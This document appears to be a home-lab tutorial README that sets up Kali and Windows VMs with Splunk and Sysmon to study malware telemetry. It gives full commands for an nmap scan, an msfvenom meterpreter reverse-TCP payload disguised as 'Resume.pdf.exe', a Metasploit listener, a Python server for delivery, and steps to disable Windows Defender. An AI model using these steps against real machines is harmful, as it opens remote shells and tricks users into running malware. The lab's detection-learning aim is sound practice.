# Basic Home Labs

## Objective

The Basic Home Labs Project is an initiative focused on hands-on experimentation using simple, cost-effective home laboratory environments. The project aims to design and deploy controlled test systems to generate and collect system, network, and security telemetry, enabling the analysis and detection of malware behavior on a target machine.
 
### Skills Learned

- Learning how to set up and configuration on home lab environments
- Detecting malicious activity using telemetry and security indicators
- Using SIEM and log analysis tools to correlate events across data sources


### Tools Used

- Nmap (Network Mapper), find open ports/services, identify operating systems, and detect vulnerabilities by sending specially crafted packets to targets and analyzing responses.
- Create Payload Using Msfvenom
- Security Information and Event Management (SIEM) system for log ingestion and analysis.

## Steps

![1](https://github.com/user-attachments/assets/158c8609-276a-404c-a393-41855c3fdaff)


- Download VirtualBox and install Windows & Kali Linux
- Install Splunk and Sysmon on Windows VM
- Configure VMs, use Internal Network and set static IP


```console
ping <target_hostname_or_IP_address>
```
- Make sure both machine can ping each other
  
```console
nmap -A <target_hostname_or_IP_address> -Pn
```
- In Kali, open Terminal, type in above command to scan target machine port, take note on which port is open

```console
msfvenom -l payloads
```
- Lists payloads avalible for use

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Attacker_IP_address> lport=4444 -f exe -o Resume.pdf.exe
```
- In this project, we will use reverse shell options
- This command will generate malware using meterpreter's reverse TCP payload which is instructed to connect back to L host and L port, the file format is exe

> [!NOTE] 
> The purpose of a reverse shell is simple: to get a shell. This is most likely everybody’s first choice. There are many different reverse shells available, and the most commonly known and stable has been the windows/meterpreter/reverse_tcp payload.

```console
msfconsole
```
- Open up a Handler that will listen on the port that we have configured in the malware by open Metasploit

```console
use exploit/multi/handler
```
- Use the multi-handler by type the above command, then we should be in the exploit itself

```console
options
```
- Type options to see what we can configure

![2](https://github.com/user-attachments/assets/98aba99f-0129-439c-af8f-1d2bfa3fabac)

- Then, change the payload in the yellow frame to be the same one that we use by typing below command

```console
set payload windows/x64/meterpreter/reverse_tcp
```
- Type options again, now we can see the payload have changed
- Set L host and type IP of the attacker machine, in this case is Kali IP
  
```console
set lhost <Attacker_IP_address>
```
![3](https://github.com/user-attachments/assets/d8a718d2-9627-4ca3-9bcd-1f5ab343ea6d)

```console
exploit
```
- Start this Handler
- Now we are listening in and waiting for pur test machine to execute the malware


- We want to set up HTTP server on Kali so our test machine can download the malware
- We will use Python in this case
- Open up a new tab Terminal
- Make sure we are in the same directory as the malware
  
```console
python3 -m http.server 9999
```
- Make sure the port that not in use
- This should allow test machine to access Kali machine and start downloading the malware from there

> [!NOTE]
> Now we have everything ready to go on our Kali Machine. We want to shift over to Windows VM. 
> Disable Windows Defender and access our web browser to download and execute the malware

- Head to Security Center and disable Defender under Virus & threat protection, click on Manage setting and turn off real-time protection
- Open web browser type in "<Attacker_IP_address>:9999"
- We will see "Resume.pdf.exe"
- Click and download it
